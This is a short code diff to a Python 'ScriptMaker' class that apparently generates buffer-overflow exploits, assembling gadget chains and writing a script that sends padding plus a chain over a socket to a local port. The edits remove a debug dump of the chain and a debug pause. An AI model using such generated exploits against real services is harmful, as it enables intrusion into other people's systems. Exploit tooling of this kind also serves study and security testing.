@@ -178,10 +178,6 @@ class ScriptMaker(object):
                             "value": [expReg[reg]]
                             })
 
-                with open("chain", "w") as f:
-                    for c in chain:
-                        f.write("chain = 0x%08x\n" % c["vaddr"])
-                        f.write("value = %s\n" % c["value"])
                 return chain
         return []
 
@@ -207,8 +203,6 @@ class ScriptMaker(object):
         self.exploit += "payload = padding + chain" + "\n"
         self.exploit += "r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" + "\n"
         self.exploit += "r.connect((\"0.0.0.0\", 4000))" + "\n"
-
-        self.exploit += "raw_input()" + "\n" # this line use to debug
 
         self.exploit += "r.send(payload+\"\\n\")" + "\n"
         self.exploit += "r.settimeout(0.1)" + "\n"
